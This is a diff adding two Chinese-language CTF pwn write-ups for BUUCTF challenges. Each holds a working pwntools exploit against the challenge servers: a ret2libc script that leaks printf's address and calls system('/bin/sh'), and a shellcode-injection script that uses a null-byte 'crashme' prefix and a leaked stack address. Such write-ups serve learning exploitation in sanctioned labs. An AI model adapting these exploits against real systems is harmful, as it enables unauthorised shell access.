@@ -663,3 +663,120 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+### pwn2_sctf_2016
+
+[题目链接](https://buuoj.cn/challenges#pwn2_sctf_2016)
+
+我去做了这个题我才知道 buuctf 允许直接下载它的 libc 文件，那我之前在寻找什么，棍木吗。
+
+ret2libc 无需多言。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 27070
+io = remote(host,port)
+# io = process('./pwn2_sctf_2016')
+elf = ELF('./pwn2_sctf_2016')
+libc = ELF('./libc-2.23.so')
+offset = 0x30
+vuln = 0x804852F
+printf_got = elf.got['printf']
+printf_plt = elf.plt['printf']
+fmt = next(elf.search(b"%s"))
+payload_1 = b'A'*offset + p32(printf_plt) + p32(vuln) + p32(fmt) + p32(printf_got)
+
+def main():
+    io.recvuntil(b"How many bytes do you want me to read? ")
+    io.sendline(b"-1")
+    io.recvuntil(b"bytes of data!\n")
+    io.sendline(payload_1)
+    io.recvuntil(b"\n")
+    leak_data = io.recv(4)
+    printf_addr = u32(leak_data)
+    print(hex(printf_addr))         # 0xf7e02020
+    libc_base = printf_addr - libc.sym['printf']
+    system = libc_base + libc.sym['system']
+    binsh = libc_base + next(libc.search(b'/bin/sh'))
+    payload_2 = b'A'*offset + p32(system) + p32(vuln) + p32(binsh)
+    io.recvuntil(b"How many bytes do you want me to read? ")
+    io.sendline(b"-1")
+    io.recvuntil(b"bytes of data!\n")
+    io.sendline(payload_2)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+
+
+```
+
+### ez_pz_hackover_2016
+
+[题目链接](https://buuoj.cn/challenges#ez_pz_hackover_2016)
+
+这道题没看 NX 保护，思路挺简单，就是 shellcode 注入，但是还是挺考验动态调试的。
+
+chall 函数：
+
+<img width="2546" height="911" alt="image" src="https://github.com/user-attachments/assets/a679f41b-30f3-40ed-aa71-1caa80ed64a5" />
+
+大概意思是先给你 s 的地址，然后让你输入一个字符串，并把这个字符串结尾的换行去掉，如果这个字符串是 crashme，就进入 vuln。
+
+我们也不用搞什么换行换 \0 的操作，直接上 \0 截断就行。
+
+然后就是动态调试找偏移：
+
+<img width="1541" height="1173" alt="e0db18b9248dce042e69e0e58e3cfc8f" src="https://github.com/user-attachments/assets/e91bb5ff-fa9a-49c9-abde-156a9c05b94c" />
+
+（发送了“crashme\x00meowmeow"）
+
+可以看到，从 `ret addr = 0xfffb687c` 到 meow 的第一个 m 的位置 `0xfffb686A` 的偏移是 0x12。
+
+（m 的 ascii 码是 0x6d，在 0x656d0065 刚好排第 3 位，前面是 \x00）
+
+<img width="1394" height="802" alt="c21549bb4c5937ca2b0e18c62271c03b" src="https://github.com/user-attachments/assets/e2f716fc-0098-4d43-b185-77c28df96d9d" />
+
+（发送了“crashme\x00AAAAAAAAAAAAAAAAAAAAAAAAAA”）
+
+发现 `ret_addr = 0xffda3b20` 到溢出的 s 的地址 `leak_stack = 0xffda3b3c` 的偏移是 0x1c。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 27275
+io = remote(host,port)
+# io = process("./ez_pz_hackover_2016")
+elf = ELF("./ez_pz_hackover_2016")
+libc = ELF("./libc-2.23.so")
+main_addr = elf.sym['main']
+printf_plt = elf.plt['printf']
+printf_got = elf.got['printf']
+
+def main():
+    # gdb.attach(io,"b *0x8048600")
+    io.recvuntil(b"Yippie, lets crash: ")
+    leak_addr = io.recvline().strip(b'\n')
+    leak_stack = int(leak_addr,16)
+    print("\n[+]Leak stack:",hex(leak_stack))
+    io.recvuntil(b"Whats your name?\n")
+    io.recvuntil(b"> ")
+    ret_addr = leak_stack - 0x1c
+    offset = 0x7c - 0x6A
+    shellcode = asm(shellcraft.sh())
+    payload = b"crashme\x00" + b'A'*offset + p32(ret_addr) + shellcode
+    io.sendline(payload)
+    # pause()
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
